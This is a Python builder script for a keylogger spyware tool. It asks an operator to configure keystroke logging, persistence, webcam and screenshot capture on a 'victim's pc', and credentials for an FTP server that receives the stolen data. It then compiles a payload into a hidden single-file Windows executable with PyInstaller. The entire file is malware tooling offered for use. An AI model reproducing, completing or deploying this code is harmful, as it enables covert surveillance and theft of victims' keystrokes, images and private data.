# -*- coding: utf-8 -*-

from keysTranslation import translate
from make_conf import get_sys_info
from rand_seq import get_new

from time import sleep
import subprocess
import json
import os

os.system('cls')
init_text = ['\n',
    ' ██████╗██████╗ ██╗   ██╗ ██╗       ██╗ █████╗ ██████╗ ███████╗',
    '██╔════╝██╔══██╗╚██╗ ██╔╝ ██║  ██╗  ██║██╔══██╗██╔══██╗██╔════╝',
    '╚█████╗ ██████╔╝ ╚████╔╝  ╚██╗████╗██╔╝███████║██████╔╝█████╗  ',
    ' ╚═══██╗██╔═══╝   ╚██╔╝    ████╔═████║ ██╔══██║██╔══██╗██╔══╝  ',
    '██████╔╝██║        ██║     ╚██╔╝ ╚██╔╝ ██║  ██║██║  ██║███████╗',
    '╚═════╝ ╚═╝        ╚═╝      ╚═╝   ╚═╝  ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝'
    ]

for part in init_text:
    print(part)
    sleep(0.09)

print("\n------------------ Initial setup ------------------")
answers = {
    "[1] The number of keystrokes to transmit data: ": "number",
    "[2] Keep working forever [Y/n]: ": "",
    "[2] Shut down in (seconds): ": "number",
    "[3] Keep data on a victim's pc [Y/n]: ": "",
    "[4] Enable webcam capturing [Y/n]: ": "",
    "[5] Enable screenshots capturing [Y/n]: ": "",
    "[server] FTP server (IPv4): ": "",
    "[server] FTP user login: ": "",
    "[server] FTP user password: ": "",
}

keys_to_check = ["[1] The number of keystrokes to transmit data: ",
    "[2] Keep working forever [Y/n]: ", "[3] Keep data on a victim's pc [Y/n]: ",
    "[4] Enable webcam capturing [Y/n]: ", "[5] Enable screenshots capturing [Y/n]: "]

for text, value in answers.items():
    if ("[2] Shut" in text) and (answers[keys_to_check[1]].strip().upper() == "Y"):
        break

    else:
        next_step = False
        while not next_step:
            try:
                response = input(text)

                if value == "number":
                    response = int(response)

                    if (text == keys_to_check[0]) and (response < 10):
                        raise Exception


                elif ('[Y/n]' in text) and (response.strip().upper() != 'Y' and response.strip().lower() != 'n'):
                    raise ValueError
                
                answers[text] = response

                next_step = True

            except ValueError:
                print("[ ERROR ]: Incorrect value entered.")
                sleep(0.65)

            except Exception:
                print(f"[ ERROR ]: ({response}) ==> the value is too small.")
                sleep(0.65)
os.system('cls')

with open('answers.json', 'w', encoding='utf-8') as fobj:
    json.dump(answers, fobj)

with open('keys_to_check.json', 'w', encoding='utf-8') as fobj:
    json.dump(keys_to_check, fobj)

# Building a new '.exe' file.
subprocess.call(["pyinstaller", "--onefile", "sample.py", "--noconsole", "--add-data", "answers.json;.", "--add-data", "keys_to_check.json;."])

os.remove('answers.json')
os.remove('keys_to_check.json')
